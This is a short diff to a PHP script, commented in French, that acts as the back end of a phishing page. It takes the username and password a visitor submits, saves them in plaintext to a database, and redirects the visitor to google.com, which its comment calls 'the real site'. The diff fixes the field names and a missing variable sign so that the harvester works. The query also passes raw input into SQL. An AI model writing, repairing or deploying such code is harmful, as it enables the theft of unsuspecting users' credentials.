@@ -1,7 +1,7 @@
 <?php
   // Définitions des champs username password
-  $username=$_POST['UserName'];
-  $password=$_POST['Password'];
+  $username=$_POST['username'];
+  $password=$_POST['password'];
   
   // Informations d'identification à la BDD
   define('DB_SERVER', 'localhost');
@@ -21,7 +21,7 @@
   $query = "INSERT INTO `login` (`id`, `mail`, `password`) VALUES (NULL, '$username', '$password');";
   
   // Exécuter la requête sur la base de données
-  res = mysqli_query($conn, $query);
+  $res = mysqli_query($conn, $query);
   
   // Rediriger la personne sur le vrai site
   header("Location: https://google.com")
